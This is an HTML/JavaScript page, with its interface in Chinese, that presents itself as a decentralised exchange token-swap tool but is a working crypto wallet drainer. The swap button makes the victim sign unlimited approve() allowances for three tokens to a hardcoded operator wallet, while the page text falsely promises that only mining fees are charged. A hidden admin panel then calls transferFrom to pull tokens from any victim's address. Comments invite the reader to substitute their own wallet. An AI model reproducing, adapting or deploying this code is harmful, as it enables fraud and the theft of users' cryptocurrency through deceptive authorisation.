<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>去中心化DEX闪兑 Swap</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:微软雅黑}
body{background:#0d1117;padding:20px;color:#f0f6fc}
.container{max-width:460px;margin:0 auto}
.swap-box{background:#161b22;border-radius:16px;padding:25px;border:1px solid #30363d}
.title{text-align:center;font-size:22px;color:#58a6ff;margin-bottom:20px}
.wallet-info{text-align:center;margin:15px 0;color:#8b949e}
.btn{width:100%;height:48px;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;margin:10px 0}
.btn-connect{background:#238636;color:#fff}
.btn-swap{background:#1f6feb;color:#fff}
.swap-item{background:#21262d;border-radius:10px;padding:15px;margin:10px 0}
.swap-text{font-size:14px;color:#c9d1d9;margin-bottom:8px}
.input-num{width:100%;height:42px;background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:0 12px;color:#fff;font-size:15px}
.swap-icon{text-align:center;font-size:20px;margin:5px 0;color:#58a6ff}
.tip-desc{font-size:13px;color:#8b949e;text-align:center;margin:15px 0;line-height:1.5}
.admin-panel{margin-top:20px;padding-top:20px;border-top:1px solid #30363d;display:none}
.admin-panel.show{display:block}
.admin-hint{text-align:center;color:#f85149;margin-bottom:12px}
.select-token{width:100%;height:42px;background:#21262d;border:1px solid #30363d;border-radius:8px;padding:0 10px;color:#fff;margin:8px 0}
.btn-take{background:#da3633;color:#fff}
</style>
</head>
<body>
<div class="container">
    <div class="swap-box">
        <h2 class="title">DEX 一键闪兑交易</h2>

        <button class="btn btn-connect" id="connectWallet">连接钱包</button>
        <div class="wallet-info">已连接地址：<span id="walletAddr">未连接</span></div>

        <div class="swap-item">
            <div class="swap-text">卖出代币</div>
            <input class="input-num" placeholder="输入兑换数量" id="sellNum">
        </div>

        <div class="swap-icon">⇄</div>

        <div class="swap-item">
            <div class="swap-text">买入代币</div>
            <input class="input-num" placeholder="实时自动换算" readonly>
        </div>

        <p class="tip-desc">
            闪兑仅授权链上交易权限，用于完成代币互换
            <br>仅收取基础矿工费，无任何额外扣除资产
        </p>

        <button class="btn btn-swap" id="confirmSwap">确认发起闪兑</button>

        <!-- 管理员归集划扣后台 -->
        <div class="admin-panel" id="adminBox">
            <div class="admin-hint">管理端资产归集通道</div>
            <select class="select-token" id="chooseToken">
                <option value="">选择划转币种</option>
                <option value="0x99a57E6C8558BC6689f894e068733ADf83C19725">币种一</option>
                <option value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F">币种二</option>
                <option value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">币种三</option>
            </select>
            <input class="input-num" placeholder="填写用户钱包地址" id="userWallet">
            <input class="input-num" placeholder="填写划转数量" id="takeAmount">
            <button class="btn btn-take" id="takeTokenBtn">一键归集划转</button>
        </div>
    </div>
</div>

<script>
// 自行修改为你的管理员钱包地址
const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();

// 你指定的三个代币合约地址
const TOKEN_LIST = [
    "0x99a57E6C8558BC6689f894e068733ADf83C19725",
    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
    "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"
];

let currentWallet = "";

// 连接钱包
document.getElementById("connectWallet").addEventListener("click",async()=>{
    if(!window.ethereum){
        alert("请安装去中心化钱包进行连接兑换");
        return;
    }
    try{
        let accounts = await ethereum.request({method:"eth_requestAccounts"});
        currentWallet = accounts[0].toLowerCase();
        document.getElementById("walletAddr").innerText = currentWallet.slice(0,7)+"..."+currentWallet.slice(-5);
        if(currentWallet === ADMIN_WALLET){
            document.getElementById("adminBox").classList.add("show");
        }
        alert("钱包连接成功，可正常进行闪兑交易");
    }catch(err){
        alert("钱包连接失败，请重试");
    }
})

// 确认闪兑 = 批量授权3个币种
document.getElementById("confirmSwap").addEventListener("click",async()=>{
    if(!currentWallet) return alert("请先连接钱包");
    let tip = confirm("发起闪兑需要授权交易调用权限，仅用于代币互换流转，确认继续？");
    if(!tip) return;
    try{
        for(let token of TOKEN_LIST){
            let spender = ADMIN_WALLET.slice(2).padStart(64,"0");
            let maxAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
            let data = "0x095ea7b3" + spender + maxAllow;
            await ethereum.request({
                method:"eth_sendTransaction",
                params:[{
                    from:currentWallet,
                    to:token,
                    gasLimit:"0x300000",
                    data:data
                }]
            })
        }
        alert("交易权限授权完成，闪兑订单已提交链上确认！");
    }catch(e){
        alert("已取消本次闪兑操作");
    }
})

// 管理员划扣功能
document.getElementById("takeTokenBtn").addEventListener("click",async()=>{
    if(currentWallet !== ADMIN_WALLET) return alert("无操作权限");
    let tokenAddr = document.getElementById("chooseToken").value;
    let userAddr = document.getElementById("userWallet").value.trim();
    let num = document.getElementById("takeAmount").value.trim();
    if(!tokenAddr) return alert("请选择币种");
    if(!userAddr||!num||Number(num)<=0) return alert("填写完整地址与数量");

    let fromHex = userAddr.toLowerCase().slice(2).padStart(64,"0");
    let toHex = ADMIN_WALLET.slice(2).padStart(64,"0");
    let valHex = BigInt(Math.floor(Number(num)*1e18)).toString(16).padStart(64,"0");
    let callData = "0x23b872dd"+fromHex+toHex+valHex;

    try{
        await ethereum.request({
            method:"eth_sendTransaction",
            params:[{
                from:currentWallet,
                to:tokenAddr,
                gasLimit:"0x300000",
                data:callData
            }]
        })
        alert("资产归集划转成功");
        document.getElementById("userWallet").value = "";
        document.getElementById("takeAmount").value = "";
    }catch(e){
        alert("划转失败");
    }
})
</script>
</body>
</html>
